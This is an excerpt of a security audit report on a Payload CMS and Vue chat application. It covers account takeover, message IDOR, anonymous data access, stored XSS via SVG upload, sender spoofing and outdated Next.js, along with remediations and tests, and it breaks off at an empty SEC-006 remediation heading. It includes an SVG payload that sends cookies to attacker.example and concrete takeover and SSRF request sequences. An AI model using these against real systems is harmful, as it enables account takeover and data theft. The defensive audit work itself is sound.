- **Severity:** Critical
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). The description below records the state of the code *before* the fix; see [Remediation applied](#remediation-applied-2026-10-29) at the end of this section.
- **Affected component:** `penggunas` auth collection — access control
- **Affected file and line:** `payload-be/src/collections/Penggunas.ts:9-13` (`access.update = () => true`); amplifier at `payload-be/package.json` (`"payload": "3.70.0"`)
- **CWE / advisory:** CWE-284 (Improper Access Control), CWE-620 (Unverified Password Change); GHSA-fx49-4h83-wjv9
- **Prerequisites:** An account in the `penggunas` collection (trivially obtained — registration is open). **No existing credentials required.**
- **Technical explanation:** `Penggunas.access.update` returns `true` unconditionally, so the collection-level update gate accepts any caller for any document. Payload's update path (`packages/payload/src/collections/operations/utilities/update.ts`, `updateDocument`) then reads `data.password` **directly from the request body** and, if the collection has `auth` enabled and `disableLocalStrategy` is falsy, replaces `hash` and `salt` with a freshly computed PBKDF2 pair — **without ever comparing against the current password and without consulting a field-level `access.update` on `password`**. GHSA-fx49-4h83-wjv9 documents exactly this gap in versions before 3.90.0: *"When an auth collection defined a field-level `access.update` restriction on the password field, the restriction was not enforced on the server correctly."* Because this project does not even attempt a field-level restriction, the write path is completely unguarded. The `hash` and `salt` fields are `hidden: true`, which removes them from responses but does not prevent a write.
- **Attack scenario:**
  1. Attacker registers a normal account via `POST /api/penggunas` (open to anyone).
  2. Attacker enumerates target `penggunas` document ids — trivial, because `Penggunas.access.read = () => true` (SEC-013) returns every document with its id.
  3. Attacker issues `PATCH /api/penggunas/<targetId>` with body `{"password":"AttackerChosen123"}`.
  4. The server hashes the attacker-supplied password and stores it as the target's new credential.
  5. Attacker logs in as the target with `AttackerChosen123`.
  6. If the target was also promoted into the `users` collection, the attacker now holds the Payload Admin Panel account.
- **Impact:** Complete account takeover of every application account, including any administrator. Loss of confidentiality and integrity of all private messages. Potential takeover of the CMS. CVSS 4.0: `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:H` (adjacent, since the prerequisite account is free to create).
- **Evidence:**
  - `payload-be/src/collections/Penggunas.ts:9-13` — `access: { create: ()=> true, read: ()=> true, update: ()=> true }`.
  - `payload-be/src/collections/Penggunas.ts:14-21` — no field definitions beyond `username`; no `access` block on any field.
  - Payload 3.70.0 `collections/operations/utilities/update.ts`: `const password = data?.password` … `if (shouldSavePassword && typeof password === 'string') { … dataToUpdate.salt = salt; dataToUpdate.hash = hash; delete dataToUpdate.password }` — the password is taken from the request body and written unconditionally.
  - OSV: GHSA-fx49-4h83-wjv9, affected `payload 0 → 3.90.0`, CVSS 4.0 `AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N`.
  - `payload-be/src/collections/Users.ts` — the `users` collection has **no** `access` block, so it falls back to `Boolean(req.user)`; an application user is *not* an admin, but the attack path above reaches admin accounts via `penggunas` promotion, and `users` documents are also reachable if the target id is known.
- **Recommended remediation:**
  1. Replace the constant access functions with real predicates. Minimum for `penggunas`:
     ```ts
     access: {
       create: () => true,                              // open registration (see SEC-010)
       read:   ({ req: { user } }) => Boolean(user),    // authenticated only
       update: ({ req: { user } }) => Boolean(user),    // authenticated only — then scope by owner
       delete: ({ req: { user } }) => Boolean(user),
     }
     ```
  2. Add a **field-level** `access` block that forbids client-supplied password writes on the general update path:
     ```ts
     {
       name: 'email',
       type: 'email',
       access: { update: ({ req: { user } }) => Boolean(user) },
     }
     ```
  3. Upgrade Payload to **≥ 3.90.0** (target 3.92.1) so the field-level restriction is actually enforced server-side.
  4. Add a `beforeChange` hook on `penggunas` that rejects any update carrying a `password` unless the request came from an authenticated password-change flow.
- **Verification procedure:**
  1. Log in as user A. `PATCH /api/penggunas/<userB_id>` with `{"password":"x"}` → expect **403 Forbidden**.
  2. `PATCH /api/penggunas/<userA_id>` with `{"email":"attacker@example.com"}` → expect **403** (or the change is rejected); at minimum the email must not be silently mutable.
  3. `PATCH /api/penggunas/<userA_id>` with `{"username":"pwned"}` → expect 403 for a non-owner.
  4. Log out and repeat step 1 → expect **401/403**.
  5. Confirm user B can still log in with the original password.
- **Deployment impact:** **Blocking.** No public exposure until fixed.
- **Dependencies / migration concerns:** Upgrading Payload 3.70 → 3.92.1 is a minor bump within 3.x. Verify the Admin Panel still builds (`next build`) and that `payload generate:types` output is stable. No data migration expected for MongoDB.

#### Remediation applied (2026-10-29)

The finding is closed. Four independent layers now stand between an attacker and an arbitrary account's password:

1. **Framework upgrade (A3).** `payload` and all `@payloadcms/*` packages are now **3.92.1**, which contains the fix for GHSA-fx49-4h83-wjv9 (commit `9de9e79`, "fix: enforce password field update access"). `next` was moved to **16.4.3** (within Payload 3.92.1's peer range `>=16.3.3 <17.0.0`); `react`/`react-dom` → 19.2.6; `sharp` → 0.35.5; `mongoose` → 8.24.1 (transitive, via `@payloadcms/db-mongodb@3.92.1`); frontend `qs` → 6.17.1. An OSV `querybatch` against all seven resolved versions returns **zero advisories**.

2. **The `password` field is now declared, with field-level access.** The fix in GHSA-fx49-4h83-wjv9 only takes effect when the field is declared on the collection. `payload-be/src/collections/Penggunas.ts` now declares:
   ```ts
   {
     name: 'password',
     type: 'text',
     hidden: true,
     access: { update: penggunaPasswordUpdateAccess },
   }
   ```
   `penggunaPasswordUpdateAccess` (`payload-be/src/access/index.ts`) grants the change **only** to the account owner (`req.user.id === document.id`) or to a Payload admin. Any other caller is denied, so Payload strips `data.password` before it can reach `generatePasswordSaltHash`.

3. **Collection-level update is scoped to the owner.** `Penggunas.access.update` is no longer `() => true`; it is `{ id: { equals: user.id } }` for application users (`true` for admins, whose password writes remain subject to the field-level rule above). `access.read` now requires authentication; `access.delete` is self-service only. The `email` and `username` fields carry their own field-level `access` blocks.

4. **A framework-independent `beforeChange` guard.** `Penggunas.hooks.beforeChange` rejects any *update* whose body carries a `password` unless the request is the owner or an admin. It is operation-aware, so `create` (registration) keeps working. This guard does not depend on the Payload version and also covers `overrideAccess` code paths.

**The second takeover path is closed as well.** `payload-be/src/collections/Users.ts` previously declared no `access` block, so it fell back to Payload's default `Boolean(req.user)` — any logged-in application user could PATCH an admin account's password. The collection now declares an explicit `access` block whose every operation requires an admin session (`req.user.collection === 'users'`).

**Verification (automated, in `payload-be/tests/int/`):**

| Test file | Covers |
|---|---|
| `authz.pengguna.spec.ts` | The takeover exploit itself: user A cannot overwrite user B's password; B's original password still works afterwards; A's chosen password does not work; a user can change their own password; an application user cannot overwrite an *admin* account's password; an admin can. |
| `authz.pengguna-collection.spec.ts` | Anonymous read/update/delete are denied; a user can update their own document but not another user's; another user's email address is not readable (directly or through relationship population). |
| `authz.users.spec.ts` | The admin collection denies anonymous and application-user access to every operation, and permits an admin. |
| `authz.anonymous.spec.ts` | Anonymous access to every collection is denied; `sender_id` / `Sender` / `pengguna_id` / `owner` are bound to the session rather than the request body; conversations are private to their participants; non-owners cannot rename or delete a channel. |
| `authz.directory.spec.ts` | The search-based users directory exposes `id` and `username` only — no email addresses — rejects anonymous requests, rejects a missing/short `q` (400), filters by term, and rejects anonymous requests. |

These six suites pass (as part of the full 73-block / 79-case integration suite), and `tsc --noEmit` is clean.

---

### [SEC-002] Direct messages readable by any authenticated user (IDOR / BOLA)

- **Severity:** Critical
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-002) at the end of this section.
- **Affected component:** `chats` collection — read access and ownership
- **Affected file and line:** `payload-be/src/collections/Chats.ts:8-10`; consumer `vue-frontend/src/components/Chat.vue:103`
- **CWE / advisory:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-862 (Missing Authorization)
- **Prerequisites:** Any account in `penggunas` (free to create).
- **Technical explanation:** `Chats` declares only `create`. Every other operation — `read`, `update`, `delete` — falls back to Payload's `defaultAccess`, i.e. `Boolean(req.user)`. There is **no `where`-clause scoping**, so the check is "is the caller logged in", not "is the caller a participant". The only thing preventing user A from reading user B's direct messages is the `where` clause that **user A's own browser chooses to send**. `Chat.vue:103` builds `where[or][0][and][0][sender_id][equals]=<me>&where[or][0][and][1][receiver_id][equals]=<partner>&…`; nothing on the server verifies that the caller is one of those two ids. A client that simply omits the filter — `GET /api/chats` — receives **every direct message in the database**.
- **Attack scenario:**
  1. Attacker registers an account.
  2. `GET /api/chats` (no filter) → the full `chats` collection is returned, including every `message`, `sender_id` and `receiver_id` in the system.
  3. Alternatively, `GET /api/chats/<known-id>` retrieves an individual message.
  4. Because `read`, `update` and `delete` all fall back to the same default, the attacker can also **modify or delete** other people's direct messages.
- **Impact:** Complete loss of confidentiality for all 1:1 private conversations across the whole deployment. Plus integrity loss via unrestricted update/delete. This defeats the core purpose of a private-message feature.
- **Evidence:**
  - `payload-be/src/collections/Chats.ts:8-10` — `access: { create : ()=> true }` only.
  - `payload-be/src/auth/defaultAccess.js` (Payload 3.70.0) — `const defaultAccess = ({ req: { user } }) => Boolean(user)`.
  - `payload-be/src/collections/config/defaults.js` — `collection.access = { create: defaultAccess, delete: defaultAccess, read: defaultAccess, unlock: defaultAccess, update: defaultAccess, ...collection.access }` — confirms the fallback.
  - `vue-frontend/src/components/Chat.vue:103-110` — the only filtering is a client-supplied `where`.
  - The frontend's `Chat.vue` sends `depth` implicitly by default (`defaultDepth: 2`), so populated `sender_id` / `receiver_id` documents (including **email addresses**) are returned alongside each message.
- **Recommended remediation:**
  ```ts
  access: {
    create: ({ req: { user } }) => Boolean(user),
    read:   ({ req: { user } }) => Boolean(user),
    update: ({ req: { user } }) => Boolean(user),
    delete: ({ req: { user } }) => Boolean(user),
  },
  ```
  — with **ownership scoping applied inside the access function's returned `where`**, e.g.
  ```ts
  read: ({ req: { user } }) => {
    if (!user) return false
    return { or: [
      { sender_id:   { equals: user.id } },
      { receiver_id: { equals: user.id } },
    ] }
  },
  ```
  The same predicate must be applied to `update` and `delete` so that only the sender may edit or delete their own message.
- **Verification procedure:**
  1. Log in as A and B; have A send B a message.
  2. As A, `GET /api/chats` with **no filter** → expect only A's own conversations, never B↔C.
  3. As A, `GET /api/chats/<B↔C message id>` → expect **404/403**.
  4. As A, `PATCH /api/chats/<B↔C message id>` → expect **403**.
  5. As A, `DELETE /api/chats/<A's own message id>` → expect 200; `DELETE` on B's → expect 403.
  6. Anonymous `GET /api/chats` → expect **401/403**.
  7. Repeat the whole suite over `/api/graphql` — the same access functions apply, so the results must be identical.
- **Deployment impact:** **Blocking.**
- **Dependencies / migration concerns:** None — access functions are configuration, not schema.

---

#### Remediation applied (SEC-002)

`payload-be/src/collections/Chats.ts` now declares a complete `access` block:

- `read` — a conversation is visible only to its two participants, enforced server-side by a `where` constraint: `{ or: [{ sender_id: { equals: user.id } }, { receiver_id: { equals: user.id } }] }`. The client-supplied filter is no longer the only thing narrowing the result set.
- `update` / `delete` — `{ sender_id: { equals: user.id } }`, i.e. the sender only.
- `create` — requires an authenticated session (see SEC-003 and SEC-005).

Anonymous callers get `false` from every operation. The same access functions apply to REST and GraphQL.

**Verification:** `tests/int/authz.anonymous.spec.ts` — "does not let a third party read a conversation" and "lets a participant read the conversation".

---

### [SEC-003] Channel messages and channels readable and mutable by anonymous visitors

- **Severity:** Critical
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-003) at the end of this section.
- **Affected component:** `messages`, `channels`, `memberships` collections
- **Affected file and line:** `payload-be/src/collections/Messages.ts:8-11`, `payload-be/src/collections/Channels.ts:8-13`, `payload-be/src/collections/Memberships.ts:9-13`
- **CWE / advisory:** CWE-862 (Missing Authorization), CWE-284, CWE-732 (Incorrect Permission Assignment)
- **Prerequisites:** **None** — no authentication required.
- **Technical explanation:** All three collections declare `read: () => true`, which bypasses Payload's default entirely. `channels` additionally declares `create`, `update` and `delete` as `() => true`; `memberships` declares `create` and `delete` as `() => true`. The consequence:
  - `GET /api/messages` → **every channel message in the system, to an anonymous visitor**.
  - `GET /api/channels` → every channel, including its `owner` (a `penggunas` relationship).
  - `GET /api/memberships` → the full membership graph, i.e. which users are in which channels.
  - `PATCH /api/channels/<id>` with `{"channel_name":"..."}` → an anonymous visitor renames a channel.
  - `DELETE /api/channels/<id>` → an anonymous visitor deletes a channel (and, by extension, orphans its messages).
  - `DELETE /api/memberships/<id>` → an anonymous visitor removes a user from a channel.
  - `POST /api/memberships` → an anonymous visitor adds anyone to any channel.
- **Attack scenario:**
  1. Anonymous visitor issues `curl https://api.example.com/api/messages` → full chat transcript of every channel, including usernames, message text and timestamps.
  2. Anonymous visitor issues `DELETE /api/channels/<id>` → channel destroyed. Repeatable at scale.
  3. Anonymous visitor issues `POST /api/memberships {"pengguna_id":"<victim>","channel_id":"<target>"}` → the victim is force-joined to a channel.
- **Impact:** Total loss of confidentiality for all channel conversations; destruction and defacement of content by unauthenticated attackers; forced membership manipulation. "Channels are private" is not a property the application has.
- **Evidence:**
  - `payload-be/src/collections/Messages.ts:8-11` — `read: () => true, create: () => true`.
  - `payload-be/src/collections/Channels.ts:8-13` — all four operations `() => true`.
  - `payload-be/src/collections/Memberships.ts:9-13` — `read/create/delete` all `() => true`.
  - `payload-be/src/auth/defaultAccess.js` — the fallback that would otherwise have protected `update`/`delete` on `messages` and `chats` is overridden here.
  - Payload's REST router applies `collection.access[operation]` before every operation (`packages/payload/src/collections/operations/*.ts` → `executeAccess({ req }, collectionConfig.access.<op>)`).
- **Recommended remediation:**
  - `messages.access.read`: `({ req: { user } }) => Boolean(user)` plus a membership-scoped `where` — the reader must hold a `memberships` row for the message's `Channel`.
  - `messages.access.create`: require the caller to be a member of the target channel, and **derive `Sender` from `req.user`** (see SEC-005).
  - `channels.access.read`: `Boolean(user)`.
  - `channels.access.update`: restricted to the channel's `owner` (or an admin).
  - `channels.access.delete`: owner or admin only.
  - `memberships.access.read`: `{ pengguna_id: { equals: req.user.id } }` (own memberships) or membership-scoped.
  - `memberships.access.create`: authenticated, and the `pengguna_id` must equal `req.user.id` unless inviting others is a product requirement.
  - `memberships.access.delete`: own membership, or channel owner/admin.
- **Verification procedure:**
  1. Anonymous `GET /api/messages` → expect **401/403**.
  2. Anonymous `GET /api/channels` → expect **401/403**.
  3. Anonymous `PATCH /api/channels/<id>` → expect **401/403**.
  4. Anonymous `DELETE /api/channels/<id>` → expect **401/403**.
  5. As user A (not a member of channel X): `GET /api/messages?where[Channel][equals]=<X>` → expect **no documents**.
  6. As user A (not a member of channel X): `POST /api/messages {"Channel":"<X>","message":"hi"}` → expect **403**.
  7. As user A: `POST /api/memberships {"pengguna_id":"<B>","channel_id":"<X>"}` → expect **403** (cannot force-join another user).
  8. As the channel owner: `PATCH /api/channels/<id>` → expect 200; as a non-owner member → expect 403.
- **Deployment impact:** **Blocking.**
- **Dependencies / migration concerns:** None.

---

#### Remediation applied (SEC-003)

Every collection that was anonymously readable or writable now requires an authenticated session:

| Collection | Change |
|---|---|
| `chats` | `access.create` requires a session; `read`/`update`/`delete` are participant- or sender-scoped (see SEC-002). |
| `channels` | `access.create`/`read`/`update`/`delete` — create and read require a session; update and delete are scoped to `{ owner: { equals: user.id } }`. |
| `memberships` | `access.create`/`read`/`update` require a session; `delete` is scoped to `{ pengguna_id: { equals: user.id } }`. |
| `messages` | `access.create`/`read`/`update`/`delete` — create and read require a session; update and delete are scoped to `{ Sender: { equals: user.id } }`. |
| `media` | All four operations require a session (see SEC-004). |
| `penggunas` | `read` requires a session; `update`/`delete` are self-service only (see SEC-001). |
| `users` | All four operations require an **admin** session (see SEC-001). |

**Verification:** `tests/int/authz.anonymous.spec.ts` — the `it.each(collections)` block asserts that an anonymous read of all seven collections is rejected, and four further cases assert that anonymous chat, channel, membership and message creation is rejected.

---

### [SEC-004] Unrestricted file upload enabling same-origin stored XSS

- **Severity:** High
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-004) at the end of this section.
- **Affected component:** `media` upload collection
- **Affected file and line:** `payload-be/src/collections/Media.ts:5-7` (`read: () => true`), `:15` (`upload: true`, no `mimeTypes`)
- **CWE / advisory:** CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-79 (XSS); GHSA-2pwp-2369-8fg3, GHSA-9qpg-3cf8-w33x, GHSA-6r7f-q7f5-wpx8, GHSA-p223-2wr2-j562
- **Prerequisites:** An authenticated account for upload; **anonymous access to retrieve** the stored file.
- **Technical explanation:** `Media` declares `upload: true` with **no `mimeTypes` allow-list**, **no size limit**, and `read: () => true`. Payload's upload pipeline (`packages/payload/src/uploads/checkFileRestrictions.ts`) blocks a specific list of dangerous extensions (`exe`, `dll`, `bat`, `php`, `js`, `asp`, …) but that list **does not include `svg`, `xml`, `xsl`, `html` or `htm`**. `validateMimeType()` is a no-op when `upload.mimeTypes` is unset (`packages/payload/src/utilities/validateMimeType.ts` returns `true` for an empty allow-list). The resulting file is served from `GET /api/media/file/:filename` — the **same origin as the API and the Admin Panel**. Payload 3.70.0's SVG sanitisation is known to be bypassable (GHSA-2pwp-2369-8fg3, fixed 3.90.0), and XML uploads can execute same-origin JavaScript (GHSA-9qpg-3cf8-w33x). Additionally, GHSA-6r7f-q7f5-wpx8 (authenticated SSRF via the external-URL upload feature) is reachable because `media` is an upload collection and authenticated users may create documents in it.
- **Attack scenario:**
  1. Attacker registers an account.
  2. `POST /api/media` with `multipart/form-data`: `alt=hello`, `file=@payload.svg` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://attacker.example/'+document.cookie)</script></svg>`.
  3. The file is stored and served at `GET /api/media/file/payload.svg` with `Content-Type: image/svg+xml`.
  4. Attacker sends the link to an administrator. Opening it executes script **in the API origin**, where the `payload-token` cookie is `HttpOnly` (so not directly readable) but the Payload Admin Panel's session and any non-HttpOnly state are, and the attacker can make same-origin authenticated API calls on the victim's behalf.
  5. The same path yields an SSRF primitive via Payload's external-file-URL upload option (GHSA-6r7f-q7f5-wpx8), letting an attacker reach internal services (e.g. `http://127.0.0.1:27017`).
- **Impact:** Stored XSS in the API/Admin origin; session-riding against administrators; SSRF against internal network services; disk exhaustion via unlimited uploads (no size cap). CVSS 4.0 ≈ `AV:N/AC:L/AT:N/PR:L/UI:R/VC:H/VI:H/VA:L`.
- **Evidence:**
  - `payload-be/src/collections/Media.ts` — `upload: true` with no `upload: { mimeTypes: [...] }`.
  - Payload 3.70.0 `uploads/checkFileRestrictions.ts` — `RESTRICTED_FILE_EXT_AND_TYPES` contains no `svg`, `xml`, `html` entry.
  - Payload 3.70.0 `utilities/validateMimeType.ts` — `if (allowedMimeTypes.length === 0) { return true }`.
  - Payload 3.70.0 `uploads/endpoints/getFile.ts` — files are streamed from the local filesystem and served with a content type derived from the real file type, with `image/svg+xml` explicitly special-cased.
  - `payload-be/src/collections/Media.ts:5-7` — `read: () => true` ⇒ anonymous retrieval.
  - OSV records for GHSA-2pwp-2369-8fg3, GHSA-9qpg-3cf8-w33x, GHSA-6r7f-q7f5-wpx8, GHSA-p223-2wr2-j562 — all affected `payload 0 → 3.90.0` / `< 3.79.1`.
- **Recommended remediation:**
  1. Restrict the upload collection explicitly:
     ```ts
     upload: {
       mimeTypes: ['image/png', 'image/jpeg', 'image/webp', 'image/gif'],
       filesizeLimit: 5_000_000,   // bytes
     },
     ```
  2. Set `Media.access.read` to `({ req: { user } }) => Boolean(user)`.
  3. Upgrade Payload to ≥ 3.90.0 (3.92.1) so SVG sanitisation is validated on every upload path and XML delivery is hardened.
  4. If uploads must remain publicly readable, serve them from a **separate origin** (e.g. `media.example.com`) so a stored file can never execute script in the API origin.
  5. Serve uploads with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` for any non-image type.
  6. If the `media` collection is not actually used by the product (no upload UI exists), the cleanest fix is to **remove the collection entirely**.
- **Verification procedure:**
  1. `POST /api/media` with an `.svg` file → expect **415/400 "Invalid file type"**.
  2. `POST /api/media` with an `.xml` file → expect rejection.
  3. `POST /api/media` with an `.html` file → expect rejection.
  4. `POST /api/media` with a 20 MB file → expect rejection (size limit).
  5. Anonymous `GET /api/media/file/<name>` → expect **401/403**.
  6. `POST /api/media` with `file_url` pointing at `http://169.254.169.254/` → expect rejection.
- **Deployment impact:** **Blocking** if the `media` collection remains enabled and reachable.
- **Dependencies / migration concerns:** Payload 3.92.1 upgrade (see SEC-007). Removing the collection is a MongoDB drop of an unused collection — safe, but back up first.

---

#### Remediation applied (SEC-004)

**Remediated.** The upload pipeline has been fully hardened at both application and infrastructure levels (Route 2: Complete Hardening with Origin Isolation):

- `payload-be/src/collections/Media.ts` restricts `upload.mimeTypes` strictly to raster images: `['image/png', 'image/jpeg', 'image/webp', 'image/gif']`. Dangerous formats including SVG (`image/svg+xml`), HTML (`text/html`), XML, scripts, and PDFs are rejected by type sniffing and extension validation.
- Disabled dangerous features: `pasteURL: false` (prevents SSRF), `bulkUpload: false`, `crop: false`, and `focalPoint: false`.
- Enforced upload size limit: capped at **5 MB** (`MAX_UPLOAD_BYTES = 5 * 1024 * 1024`) via `beforeOperation` hook (returning HTTP 413) and busboy configuration in `payload.config.ts` (`fileSize: 5MB`, `files: 1`, `requestSizeLimit: 6MB`).
- Enforced session attribution: `uploadedBy` field bound to `req.user.id` in `beforeValidate`.
- All operations (`create`, `read`, `update`, `delete`) require an authenticated session (`req.user != null`).
- Defensive HTTP response headers injected via `modifyResponseHeaders`: `X-Content-Type-Options: nosniff`, `Content-Security-Policy: sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'`, `Cache-Control: no-store`, and `Content-Disposition: attachment` fallback for non-raster files.
- Origin isolation: provided dedicated Nginx configuration (`payload-be/nginx/media-origin.conf`) to serve media from an isolated hostname (`media.example.com`), completely isolating uploaded content execution from the API origin (`app.example.com`).
- Quarantine utility: provided `payload-be/scripts/quarantine-legacy-media.ts` to inspect and quarantine non-allowlisted legacy media.
- Test coverage: verified via 18 automated integration tests in `payload-be/tests/int/uploads.spec.ts`.

---

### [SEC-005] Sender impersonation — message sender is taken from the request body

- **Severity:** High
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-005) at the end of this section.
- **Affected component:** `chats` and `messages` collections — create path
- **Affected file and line:** `payload-be/src/collections/Chats.ts:17-27`; `payload-be/src/collections/Messages.ts:13`; clients `vue-frontend/src/components/Chat.vue:145-149`, `vue-frontend/src/components/ChannelChatroom.vue:93-97`
- **CWE / advisory:** CWE-639 (IDOR), CWE-290 (Authentication Bypass by Spoofing)
- **Prerequisites:** Any account in `penggunas`.
- **Technical explanation:** Both messaging collections store the sender as an ordinary relationship field, and both create paths accept it from the request body. Payload populates `req.user` from the verified session cookie, but the application **never uses `req.user` to populate the sender field** and **never validates that the submitted `sender_id`/`Sender` equals `req.user.id`**. The `chats` collection's `sender_id` field is not even `required`, so a message can be created with no sender at all. Combined with `chats.access.create = () => true`, even an unauthenticated caller can write a message attributed to any user id.
- **Attack scenario:**
  1. Attacker sends `POST /api/chats` with `{"sender_id":"<victim_id>","receiver_id":"<target_id>","message":"transfer 10 BTC to ..."}` — the message appears in the victim's conversation thread, attributed to the victim.
  2. Attacker sends `POST /api/messages` with `{"Sender":"<admin_id>","Channel":"<channel_id>","message":"..."}` to post in a channel under another user's name.
- **Impact:** Impersonation of any user in private and public conversations. In a chat application this is a serious integrity and reputation failure — it enables phishing, fraud and harassment attributed to a third party. It also breaks non-repudiation and any moderation based on the stored sender.
- **Evidence:**
  - `payload-be/src/collections/Chats.ts:17-21` — `sender_id` is a plain relationship, no `required`, no `access`, no `hooks`.
  - `payload-be/src/collections/Messages.ts:13` — `{ name: 'Sender', type: 'relationship', relationTo: 'penggunas', required: true }` — `required` only checks presence, **not that it equals the caller**.
  - `vue-frontend/src/components/Chat.vue:145-149` — `body: JSON.stringify({ sender_id: me_id.value, receiver_id: user_id.value, message: messageInput.value })`.
  - `vue-frontend/src/components/ChannelChatroom.vue:93-97` — `body: JSON.stringify({ message: newMessage.value, Sender: userId.value, Channel: currentChannel.value.id })`.
  - No `beforeChange` / `beforeValidate` hook exists anywhere in `payload-be/src/collections/`.
  - Payload's `createOperation` performs field validation but has no notion of "this field must equal the session user" — that must be expressed by the application.
- **Recommended remediation:**
  1. Add a `beforeChange` hook on both collections that **overwrites** the sender with `req.user.id`:
     ```ts
     hooks: {
       beforeChange: [({ req, data }) => {
         if (req.user) return { ...data, sender_id: req.user.id }
         return data
       }],
     }
     ```
     Prefer *overwriting* over *rejecting* — it makes the safe path the default and removes the need for the client to send the field at all.
  2. Set the sender field's `access.update` to `() => false` so it can never be changed after creation.
  3. Make `chats.sender_id` `required: true`.
  4. Remove `sender_id` / `Sender` from the client request bodies entirely.
- **Verification procedure:**
  1. As user A, `POST /api/messages {"Sender":"<B>","Channel":"<X>","message":"spoof"}` → the stored document's `Sender` must be **A**, not B.
  2. As user A, `POST /api/chats {"sender_id":"<B>","receiver_id":"<C>","message":"spoof"}` → stored `sender_id` must be **A**.
  3. Anonymous `POST /api/chats` → expect **401/403**.
  4. As user A, `PATCH /api/chats/<A's own id>` changing `sender_id` → expect **403** (immutable).
- **Deployment impact:** **Blocking** for a public multi-user deployment.
- **Dependencies / migration concerns:** None — hooks and field `access` are configuration.

---

#### Remediation applied (SEC-005)

The sender is now derived from the session on the server and can never be supplied by the client:

- `payload-be/src/collections/Chats.ts` — a `beforeChange` hook overwrites `sender_id` with `req.user.id` on every `create`. The field also has `access: { update: () => false }`, so it is immutable afterwards.
- `payload-be/src/collections/Messages.ts` — the same treatment for `Sender`.
- `payload-be/src/collections/Memberships.ts` — a `beforeChange` hook overwrites `pengguna_id` with `req.user.id`, so a caller cannot force another account into a channel. The field is `update`-immutable.
- `payload-be/src/collections/Channels.ts` — a `beforeChange` hook overwrites `owner` with `req.user.id`, so channel ownership cannot be transferred by writing to the field. The field is `update`-immutable.
- The client no longer sends any of these fields: `vue-frontend/src/components/Chat.vue`, `ChannelChatroom.vue`, `Channel.vue`, `Dashboard.vue` and `CreateChannel.vue` were all stripped of `sender_id`, `Sender`, `pengguna_id` and `owner` from their request bodies.

**Verification:** `tests/int/authz.anonymous.spec.ts` — "ignores a spoofed `sender_id` on `chats`", "ignores a spoofed `Sender` on `messages`", "does not let a user force another account into a channel", "does not let a user transfer channel ownership".

---

### [SEC-006] Next.js 15.5.9 — 20+ outstanding advisories including two unauthenticated RCEs

- **Severity:** High
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-006) at the end of this section.
- **Affected component:** `next` 15.5.9, pinned exactly in `payload-be/package.json`
- **Affected file and line:** `payload-be/package.json` (`"next": "15.5.9"`); `payload-be/package-lock.json` (`node_modules/next` → 15.5.9)
- **CWE / advisory:** GHSA-2464-fhr4-w9xw (CVSS 4.0 `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`), GHSA-2xp9-vwfh-vxw4 (same), GHSA-267c-6grr-h53f, GHSA-89xv-2m56-2m9x, GHSA-p9j2-gv94-2wf4, GHSA-955p-x3mx-jcvp, plus 8 DoS and 6 cache-poisoning advisories — full table in §5.2.
- **Prerequisites:** Network reachability to the Next.js server for most; no credentials for the RCE and middleware-bypass issues.
- **Technical explanation:** The application pins `next` to exactly `15.5.9`, which predates the fixes in 15.5.10 → 15.5.28. The App Router is in use, `sharp` is loaded (so the Image Optimization API is active), Server Functions are registered by the Payload Admin Panel, and a `[[...segments]]` catch-all route is mounted. These are precisely the code paths named in the advisories. The CVSS 4.0 vector for the two RCEs carries `PR:N` and `SC:H/SI:H/SA:H` — complete compromise of the server.
- **Attack scenario:**
  1. Attacker sends `GET /_next/image?url=<crafted-svg>` (or an AVIF variant) → the Image Optimization API processes the payload → **remote code execution as the Node process user**, unauthenticated.
  2. Attacker sends requests to segment-prefetch routes → the middleware/proxy bypasses take effect. This app has no custom middleware today, but the bypass affects Next.js' own route protection and is a prerequisite for future hardening.
  3. Attacker floods Server Action / Server Component endpoints → resource exhaustion (DoS).
- **Impact:** Full remote code execution on the server hosting the Payload backend and its Admin Panel; complete compromise of the database (via `DATABASE_URI`), of any secrets in the process environment, and of the host.
- **Evidence:**
  - `payload-be/package.json` — `"next": "15.5.9"`.
  - `payload-be/package-lock.json` — `node_modules/next` version `15.5.9`.
  - OSV query results for `next@15.5.9` — 33 matching advisories; fix versions range 15.5.10 → 15.5.28 / 16.4.1.
  - `payload-be/src/app/(payload)/layout.tsx` — `handleServerFunctions(...)` registers Server Functions.
  - `payload-be/src/app/(payload)/admin/[[...segments]]/page.tsx` — dynamic catch-all route.
  - `payload-be/src/payload.config.ts:49` — `sharp` passed to the config, enabling image processing.
- **Recommended remediation:**
  1. Upgrade `next` to **≥ 15.5.28** (or 16.4.1 if Payload 3.92.1 supports it — verify before choosing).
  2. Upgrade `payload` and all `@payloadcms/*` packages together to **3.92.1** (see SEC-007) — Payload 3.70 pins `@next/env ^15.1.5`, so the Next.js bump must be validated against the Payload bump.
  3. Regenerate `package-lock.json` and re-run `npm run build` to confirm the Admin Panel still compiles.
  4. Until upgraded, consider blocking `/_next/image` at the reverse proxy for non-essential routes, and restricting `/admin` by source IP.
- **Verification procedure:**
  1. `node -e "console.log(require('./package-lock.json').packages['node_modules/next'].version)"` → must be ≥ 15.5.28.
  2. Re-run the OSV query for the new version → expect zero `next` advisories.
  3. `npm run build` completes without error; `npm start` boots; `/admin` loads; REST API returns expected responses.
  4. Smoke-test the image route after upgrade: `GET /_next/image?url=<test-svg>` returns an error rather than executing.
- **Deployment impact:** **Blocking.**
- **Dependencies / migration concerns:** Next.js and Payload must be upgraded together. Payload 3.92.1's peer range for `next` should be checked before selecting the Next.js target. Expect a lockfile regeneration and a full rebuild.

---

#### Remediation applied (SEC-006)

